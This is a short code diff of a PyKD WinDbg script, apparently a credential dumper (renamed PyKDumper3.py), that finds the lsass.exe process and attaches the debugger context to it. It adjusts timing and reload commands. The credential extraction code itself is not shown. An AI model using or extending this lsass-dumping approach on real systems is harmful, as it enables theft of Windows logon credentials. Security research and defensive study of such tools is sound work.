@@ -5,8 +5,11 @@ import time
 from pyDes import *
 from binascii import unhexlify,hexlify
 
+# support Python 3.8
+# can be run from local KD
 # .load C:\Users\uf0\Desktop\pykd\pykd.dll
-# !py c:\users\uf0\desktop\lsass.py
+# !py c:\users\uf0\desktop\PyKDumper3.py
+
 
 nt = None
 EPROCESS = None
@@ -37,10 +40,10 @@ def main():
         if processName == "lsass.exe":
             eproc = ("%x"% process )
             
-    time_interval = 0.2
-    pykd.dbgCommand(".process /i /p /r %s" % eproc)
+    time_interval = 0.4
+    pykd.dbgCommand(".process /p /r %s" % eproc)
     time.sleep(time_interval)
-    pykd.go()
+    #pykd.go()
     # reload userland modules
     pykd.dbgCommand(".reload /user")
     time.sleep(time_interval)
